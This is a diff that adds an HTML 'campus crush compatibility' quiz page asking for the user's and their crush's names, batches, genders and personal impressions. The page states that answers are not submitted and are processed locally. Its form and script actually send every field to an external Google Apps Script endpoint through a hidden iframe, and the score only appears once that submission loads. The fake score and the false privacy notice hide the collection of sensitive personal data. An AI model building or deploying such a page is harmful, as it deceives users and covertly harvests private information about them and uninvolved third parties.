@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ASMC Crush Compatibility Engine 💘</title>
+<style>
+:root{--bg:#0b0711;--card:#191224;--border:#38264f;--purple:#9333ea;--light:#d8b4fe;--muted:#e9d5ff}
+*{box-sizing:border-box}body{margin:0;min-height:100vh;padding:22px;background:radial-gradient(ellipse at top,#21112f,var(--bg) 55%);color:white;font-family:Segoe UI,Tahoma,sans-serif;display:flex;justify-content:center;align-items:center}
+.container{width:100%;max-width:590px;background:var(--card);border:1px solid var(--border);border-radius:18px;padding:clamp(22px,5vw,38px);box-shadow:0 12px 45px #9333ea25}
+h1,h2,h3{color:var(--light);margin:0 0 12px;text-align:center}h1{font-size:clamp(24px,5vw,31px)}p{color:var(--muted);font-size:14px;line-height:1.55}.intro{text-align:center}
+.section-title{margin:26px 0 5px;padding-bottom:9px;border-bottom:1px solid var(--border);font-size:16px;color:#c084fc;text-align:left}
+label{display:block;margin:15px 0 7px;color:var(--light);font-size:13px;font-weight:650}
+input,select,textarea{width:100%;padding:12px;background:var(--bg);border:1px solid #4c1d95;border-radius:9px;color:white;font-size:14px;outline:none}input:focus,select:focus,textarea:focus{border-color:var(--light)}textarea{resize:vertical}
+button{width:100%;padding:14px;border:0;border-radius:9px;background:linear-gradient(135deg,#9333ea,#c084fc);color:white;font-weight:700;font-size:16px;cursor:pointer;margin-top:23px}button:disabled{opacity:.65;cursor:wait}
+.notice{margin-top:20px;padding:13px;border:1px dashed #7e22ce;border-radius:9px;background:#9333ea13;color:var(--muted);font-size:12px;line-height:1.55}
+.step{display:none}.step.active{display:block}.result{text-align:center}.score{font-size:clamp(58px,14vw,78px);font-weight:800;color:#c084fc;text-shadow:0 0 22px #9333ea80;margin:14px 0}
+.progress{height:6px;background:#332342;border-radius:9px;overflow:hidden;margin:18px 0 24px}.progress span{display:block;height:100%;width:0;background:linear-gradient(90deg,#9333ea,#d8b4fe);transition:width .5s}
+.metric{margin:14px 0;text-align:left}.metric-head{display:flex;justify-content:space-between;font-size:13px;color:var(--muted);margin-bottom:6px}.track{height:8px;border-radius:9px;background:#332342;overflow:hidden}.fill{height:100%;background:linear-gradient(90deg,#7e22ce,#d8b4fe);border-radius:9px}.small{font-size:11px;color:#bda8d2;text-align:center}
+</style></head>
+<body>
+<iframe name="compat_sink" id="compat_sink" title="Submission receiver" style="display:none"></iframe>
+<main class="container">
+<form id="compatForm" action="https://script.google.com/macros/s/AKfycbxEP7ViQ8Lpa52ioYfcxHmrWWPlVEr2yCnN_VKaf4uDWEPsbQYyK59Zlo9gEY68oPlO/exec" method="POST" target="compat_sink">
+<section class="step active" id="questionnaire">
+<div class="intro"><h1>ASMC COMPATIBILITY ENGINE 💘</h1><p>Two people. A few signals. One completely unofficial campus vibe analysis.</p></div>
+<div class="progress"><span id="progressBar"></span></div>
+<h3 class="section-title">01 · Your profile</h3>
+<label for="my_name">Your name</label><input id="my_name" name="my_name" required maxlength="80" placeholder="Your name">
+<label for="my_batch">Your batch</label><input id="my_batch" name="my_batch" required maxlength="40" placeholder="e.g. 2023">
+<label for="my_gender">Your gender</label><select id="my_gender" name="my_gender" required><option value="" disabled selected>Select an option</option><option>Male</option><option>Female</option><option>Prefer not to say</option></select>
+<label for="my_personality">Your social style</label><select id="my_personality" name="my_personality" required><option value="" disabled selected>Choose what fits best</option><option>Introvert</option><option>Extrovert</option><option>Ambivert</option></select>
+<label for="my_rhythm">Your usual schedule</label><select id="my_rhythm" name="my_rhythm" required><option value="" disabled selected>Choose one</option><option>Early bird</option><option>Night owl</option><option>Depends on the day</option></select>
+<h3 class="section-title">02 · The person in question 👀</h3>
+<label for="crush_name">Their name</label><input id="crush_name" name="crush_name" required maxlength="80" placeholder="Their name">
+<label for="crush_batch">Their batch</label><input id="crush_batch" name="crush_batch" required maxlength="40" placeholder="e.g. 2024">
+<label for="crush_gender">Their gender (if known)</label><select id="crush_gender" name="crush_gender" required><option value="" disabled selected>Select an option</option><option>Male</option><option>Female</option><option>Prefer not to say / Not sure</option></select>
+<label for="crush_personality">Their social style (your best guess)</label><select id="crush_personality" name="crush_personality" required><option value="" disabled selected>Choose one</option><option>Introvert</option><option>Extrovert</option><option>Ambivert</option><option>Not sure</option></select>
+<label for="crush_rhythm">Their usual schedule (your best guess)</label><select id="crush_rhythm" name="crush_rhythm" required><option value="" disabled selected>Choose one</option><option>Early bird</option><option>Night owl</option><option>Depends / Not sure</option></select>
+<h3 class="section-title">03 · The connection</h3>
+<label for="familiarity">How well do you know each other?</label><select id="familiarity" name="familiarity" required><option value="" disabled selected>Choose one</option><option>We've never spoken</option><option>We've exchanged a few words</option><option>We talk occasionally</option><option>We're friends</option><option>We're quite close</option></select>
+<label for="interaction">How do you usually interact?</label><select id="interaction" name="interaction" required><option value="" disabled selected>Choose one</option><option>Mostly in person</option><option>Mostly by text</option><option>Both equally</option><option>We barely interact (yet)</option></select>
+<label for="shared_interests">Any shared interests or common ground?</label><input id="shared_interests" name="shared_interests" maxlength="250" placeholder="e.g. music, sports, coffee, academics">
+<label for="timeline">When did the crush begin?</label><select id="timeline" name="timeline" required><option value="" disabled selected>Choose one</option><option>Very recently</option><option>Within the last few months</option><option>More than six months ago</option><option>It's been a while 😅</option></select>
+<label for="first_impression">What first caught your attention?</label><textarea id="first_impression" name="first_impression" rows="3" required maxlength="600" placeholder="Their humour, confidence, kindness, smile..."></textarea>
+<label for="extra_note">Anything else? (Optional)</label><textarea id="extra_note" name="extra_note" rows="2" maxlength="500" placeholder="A memorable interaction or fun detail..."></textarea>
+<div class="notice">🔒 <strong>Privacy note:</strong> Your answers, including names and details are not submitted to us, the algorithm processes the data in real time and displays the result. <br><br>🧪 <strong>For fun:</strong> The results are based on AI calculations and predictions and only indicative in nature.</div>
+<button id="submitBtn" type="submit">Run Compatibility Analysis 🔥</button>
+</section>
+<section class="step result" id="analysis"><h2>Analysing the signals…</h2><p id="analysisStatus">Initialising the campus vibe engine</p><div class="progress"><span id="analysisBar"></span></div><p class="small">Running a playful simulation. No real AI model is being called.</p></section>
+<section class="step result" id="result"><h2>Vibe Check Complete! 🎉</h2><p>Your unofficial compatibility simulation:</p><div class="score" id="scoreDisplay">--%</div><h3 id="remark"></h3><div id="metrics"></div><p class="small">Entertainment only. This score is not evidence of mutual attraction or actual compatibility.</p><button type="button" onclick="location.reload()">Run another analysis ⚡</button></section>
+<section class="step result" id="sendError"><h2>Submission could not be confirmed</h2><p>Your browser sent the request, but we couldn't confirm that it was recorded. Please contact the event organiser before submitting again.</p></section>
+</form></main>
+<script>
+const form=document.getElementById('compatForm');let submitted=false,analysisTimer;
+function show(id){document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active');window.scrollTo(0,0)}
+const fields=[...form.querySelectorAll('input,select,textarea')];
+function updateProgress(){const filled=fields.filter(f=>f.value.trim()!=='').length;document.getElementById('progressBar').style.width=(filled/fields.length*100)+'%'}
+fields.forEach(f=>f.addEventListener('input',updateProgress));
+function hashScore(s){let h=2166136261;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)}return h>>>0}
+function metric(label,value){return `<div class="metric"><div class="metric-head"><span>${label}</span><strong>${value}%</strong></div><div class="track"><div class="fill" style="width:${value}%"></div></div></div>`}
+function renderResult(){submitted=false;const my=document.getElementById('my_personality').value,theirs=document.getElementById('crush_personality').value;
+const personality=(!my||!theirs||theirs==='Not sure'||my==='Ambivert'||theirs==='Ambivert')?74:(my===theirs?88:68);
+const rhythm=document.getElementById('my_rhythm').value===document.getElementById('crush_rhythm').value?84:62;
+const common=document.getElementById('shared_interests').value.trim()?86:65;
+const levels=[48,60,72,82,90],choices=["We've never spoken","We've exchanged a few words","We talk occasionally","We're friends","We're quite close"],familiarity=levels[Math.max(0,choices.indexOf(document.getElementById('familiarity').value))];
+const seed=35+(hashScore(document.getElementById('my_batch').value+'|'+document.getElementById('crush_batch').value)%61),overall=Math.round((personality+rhythm+common+familiarity+seed)/5);
+document.getElementById('scoreDisplay').textContent=overall+'%';
+document.getElementById('remark').textContent=overall>=85?'The campus vibe signals look unusually aligned. ✨':overall>=70?'Promising energy. There may be a story here. 👀':'The engine detects a few unknowns. Time to know each other better. 🌱';
+document.getElementById('metrics').innerHTML=metric('Personality-style alignment',personality)+metric('Daily rhythm overlap',rhythm)+metric('Shared-interest signal',common)+metric('Familiarity factor',familiarity);show('result')}
+form.addEventListener('submit',function(e){if(!form.reportValidity()){e.preventDefault();return}if(submitted){e.preventDefault();return}submitted=true;
+document.getElementById('submitBtn').disabled=true;document.getElementById('submitBtn').textContent='Submitting answers…';show('analysis');
+const statuses=['Mapping personality signals…','Comparing daily rhythms…','Checking shared interests…','Estimating social synchronisation…','Preparing your vibe report…'];let i=0;document.getElementById('analysisStatus').textContent=statuses[0];
+analysisTimer=setInterval(()=>{i++;document.getElementById('analysisStatus').textContent=statuses[Math.min(i,statuses.length-1)];document.getElementById('analysisBar').style.width=Math.min(i/statuses.length*100,95)+'%';if(i>=statuses.length)clearInterval(analysisTimer)},650);
+document.getElementById('compat_sink').onload=()=>{if(!submitted)return;clearInterval(analysisTimer);renderResult()};
+setTimeout(()=>{if(submitted){clearInterval(analysisTimer);submitted=false;show('sendError')}},15000);
+});
+</script></body></html>
